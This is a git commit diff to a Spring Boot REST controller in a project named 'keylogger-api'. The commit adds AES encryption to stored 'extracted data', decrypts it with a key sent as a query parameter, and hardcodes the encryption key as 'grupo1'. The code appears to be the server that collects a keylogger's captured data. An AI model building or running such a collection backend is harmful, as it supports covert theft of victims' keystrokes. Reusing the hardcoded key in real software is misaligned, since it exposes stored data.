d5f9efdc3a24f25983a9be46834f367a345dcf03
José Suárez <74939658+jaSuarezGH@users.noreply.github.com>
2023-12-24 15:09:52 -0400

    Agrega encriptación y desencriptación de la data
    También se cambio a consecuente la estructura de los endpoints tipo GET

--- keylogger-api/src/main/java/com/grupo1/keyloggerapi/controllers/ExtractedDataController.java
+++ keylogger-api/src/main/java/com/grupo1/keyloggerapi/controllers/ExtractedDataController.java
@@ -8,35 +8,47 @@ import org.springframework.web.bind.annotation.*;
 
 import com.grupo1.keyloggerapi.models.ExtractedDataModel;
 import com.grupo1.keyloggerapi.services.ExtractedDataService;
+import com.grupo1.keyloggerapi.utilities.AESEncryptionDecryption;
 
 @RestController
 @RequestMapping("/data")
 public class ExtractedDataController {
     @Autowired
     ExtractedDataService extractedDataService;
+    private final String encryptationKey = "grupo1";
+    private AESEncryptionDecryption cypher = new AESEncryptionDecryption();
 
-    @GetMapping()
-    public ArrayList<ExtractedDataModel> obtainAllData(){
-        return extractedDataService.obtainData();
+    @GetMapping("all/query")
+    public ArrayList<ExtractedDataModel> obtainAllData(@RequestParam("key") String privateKey) {
+        ArrayList<ExtractedDataModel> result = extractedDataService.obtainData();
+        for (int i = 0; i < result.size(); i++) {
+            result.get(i).setData(cypher.decrypt(result.get(i).getData(), privateKey));
+        }
+        return result;
     }
 
     @PostMapping()
-    public ExtractedDataModel saveData(@RequestBody ExtractedDataModel data){
+    public ExtractedDataModel saveData(@RequestBody ExtractedDataModel data) {
+        data.setData(cypher.encrypt(data.getData(), encryptationKey));
         return this.extractedDataService.saveData(data);
     }
 
-    @GetMapping( path = "/{id}")
-    public Optional<ExtractedDataModel> obtainDataById(@PathVariable("id") Long id) {
-        return this.extractedDataService.obtainDataById(id);
+    @GetMapping("id/query")
+    public Optional<ExtractedDataModel> obtainDataById(@RequestParam("id") long id,
+            @RequestParam("key") String privateKey) {
+        Optional<ExtractedDataModel> result = this.extractedDataService.obtainDataById(id);
+        if (result.isPresent())
+            result.get().setData(cypher.decrypt(result.get().getData(), privateKey));
+        return result;
     }
 
-    @DeleteMapping( path = "/{id}")
-    public String deleteDataById(@PathVariable("id") Long id){
+    @DeleteMapping(path = "/{id}")
+    public String deleteDataById(@PathVariable("id") Long id) {
 
-        if(this.extractedDataService.obtainDataById(id).isPresent()){
+        if (this.extractedDataService.obtainDataById(id).isPresent()) {
             this.extractedDataService.deleteDataById(id);
             return "Deleted data with id " + id;
-        }else{
+        } else {
             return "Could not delete data with id " + id + " (probably id does not exist)";
         }
     }
